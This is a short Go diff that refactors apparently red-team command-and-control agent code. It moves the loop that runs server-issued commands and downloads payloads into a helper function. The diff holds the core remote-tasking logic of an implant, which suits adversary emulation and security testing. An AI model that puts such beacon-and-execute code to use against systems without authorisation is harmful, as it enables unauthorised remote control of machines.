@@ -4,7 +4,6 @@ import (
 	"bufio"
 	"bytes"
 	"encoding/json"
-	"github.com/preludeorg/pneuma/commands"
 	"github.com/preludeorg/pneuma/util"
 	"io"
 	"net"
@@ -44,17 +43,7 @@ func respond(conn net.Conn, beacon util.Beacon, message string, agent *util.Agen
 	var tempB util.Beacon
 	json.Unmarshal([]byte(util.Decrypt(message)), &tempB)
 	beacon.Links = beacon.Links[:0]
-	for _, link := range tempB.Links {
-		var payloadPath string
-		if len(link.Payload) > 0 {
-			payloadPath = requestPayload(link.Payload)
-		}
-		response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
-		link.Response = strings.TrimSpace(response) + "\r\n"
-		link.Status = status
-		link.Pid = pid
-		beacon.Links = append(beacon.Links, link)
-	}
+	runLinks(&tempB, &beacon, agent, "\r\n")
 	refreshBeacon(agent, &beacon)
 	bufferedSend(conn, beacon)
 }
